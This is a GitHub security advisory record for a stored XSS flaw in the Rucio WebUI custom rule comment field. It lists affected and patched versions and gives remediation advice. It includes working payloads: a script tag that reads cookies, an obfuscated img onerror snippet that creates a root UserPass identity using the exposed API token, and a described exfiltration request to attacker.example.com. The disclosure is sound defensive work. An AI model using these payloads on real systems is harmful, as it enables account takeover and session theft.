{
  "Severity": "HIGH",
  "UpdatedAt": "2026-02-25T18:58:22Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "rucio-webui"
  },
  "Advisory": {
    "DatabaseId": 339284,
    "Id": "GSA_kwCzR0hTQS1yd2o5LTdqNDgtOWY3cc4ABS1U",
    "GhsaId": "GHSA-rwj9-7j48-9f7q",
    "References": [
      {
        "Url": "https://github.com/rucio/rucio/security/advisories/GHSA-rwj9-7j48-9f7q"
      },
      {
        "Url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
      },
      {
        "Url": "https://github.com/rucio/rucio/releases/tag/35.8.3"
      },
      {
        "Url": "https://github.com/rucio/rucio/releases/tag/38.5.4"
      },
      {
        "Url": "https://github.com/rucio/rucio/releases/tag/39.3.1"
      },
      {
        "Url": "https://github.com/advisories/GHSA-rwj9-7j48-9f7q"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-rwj9-7j48-9f7q"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2026-25733"
      }
    ],
    "Description": "### Summary\nA stored Cross-site Scripting (XSS) vulnerability was identified in the Custom Rules function of the WebUI where attacker-controlled input is persisted by the backend and later rendered in the WebUI without proper output encoding. This allows arbitrary JavaScript execution in the context of the WebUI for users who view affected pages, potentially enabling session token theft or unauthorized actions.\n\n---\n### Details\nA malicious payload supplied in the `comment` field is stored by the backend. When the rule is later viewed or approved, the stored script executes in the WebUI origin.\n\n**Create Path**:  \nMonitoring \u003e Subscriptions and Rules \u003e Request New Rule \u003e Options \u003e Add Comment\n\n**Trigger Paths**:  \n- **User Trigger**: Monitoring \u003e Subscriptions and Rules \u003e Show My Rules \u003e *RULE NAME*  \n  (`https://localhost:8443/ui/rule?rule_id=\u003cRULE_ID\u003e`)\n- **Admin Trigger**: Data Transfer (R2D2) \u003e Approve Rules \u003e *RULE NAME*\n\n**Create Request**\n```http\nPOST /proxy/rules/ HTTP/1.1\n...\n{\"dids\":[{\"scope\":\"test\",\"name\":\"dataset1\"}],\"account\":\"pentest\",\"ask_approval\":true,\"activity\":\"User Subscriptions\",\"rse_expression\":\"WEB1\",\"copies\":1,\"grouping\":\"DATASET\",\"lifetime\":15552000,\"comment\":\"\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\",\"asynchronous\":false,\"notify\":\"N\"}\n```\n\n**Response**\n```http\nHTTP/1.1 201 CREATED\n...\n[\"c2d675c1979d4549b26eede3531a7e6a\"]\n```\n\n**Creating RSE with XSS payload in comment**\n\u003cimg width=\"1032\" height=\"667\" alt=\"Creating RSE with XSS payload in comment\" src=\"https://github.com/user-attachments/assets/00258839-5288-48ed-856c-30cfee19d3c4\" /\u003e\n\n**Reviewing rule creation requests**\n\u003cimg width=\"1201\" height=\"625\" alt=\"Reviewing rule creation requests\" src=\"https://github.com/user-attachments/assets/1b5fc7af-a664-42dc-a3d4-b00755fe2bd7\" /\u003e\n\n**XSS Payload triggering on rule review**\n\u003cimg width=\"1197\" height=\"417\" alt=\"XXS Payload triggering on rule review\" src=\"https://github.com/user-attachments/assets/463e843a-1e9e-492e-960f-7d3edac2fd1e\" /\u003e\n\n---\n### Impact\nAny authenticated user who views affected resources may execute attacker-controlled JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users or administrative users only.\n\nThe impact is amplified by:\n- Session cookies that are accessible to JavaScript (missing HttpOnly flag).\n- API tokens exposed to the WebUI via JavaScript variables.\n\nAn attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).\n\nAttackers can also perform actions as the victim like creating a new UserPass identity with an attacker known password, creating/deleting an RSE, or exfiltrating data.\n\n**XSS Payload to Create Root UserPass**\n```html\n\u003cimg src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()\u003e\n```\n\n---\n### Remediation / Mitigation\nAll client-side renderings of server-provided or user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe methods such as `.html()` should be avoided unless the content is explicitly sanitized. Safer alternatives include `.text()`, creating text nodes, or using a templating system that enforces automatic escaping.\n\nAdditional defense-in-depth measures include:\n- Enforcing a strict Content Security Policy (CSP).\n- Setting the HttpOnly flag on session cookies.\n- Avoiding exposure of API tokens in JavaScript-accessible variables.\n\n\u003e Note that many pages were found setting the API token as `token` in an authenticated response like `var token = \"root-root-webui-...:\"` (See `/ui/list_accounts` for example)\n\n---\n### Resources\n- OWASP XSS Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2026-02-25T18:58:20Z",
    "Severity": "HIGH",
    "Summary": "Rucio WebUI Vulnerable to Stored Cross-site Scripting (XSS) through Custom Rule Function",
    "UpdatedAt": "2026-02-25T18:58:22Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.3,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "39.3.1"
      },
      "VulnerableVersionRange": "\u003e= 39.0.0rc1, \u003c 39.3.1"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "38.5.4"
      },
      "VulnerableVersionRange": "\u003e= 36.0.0rc1, \u003c 38.5.4"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "35.8.3"
      },
      "VulnerableVersionRange": "\u003c 35.8.3"
    }
  ]
}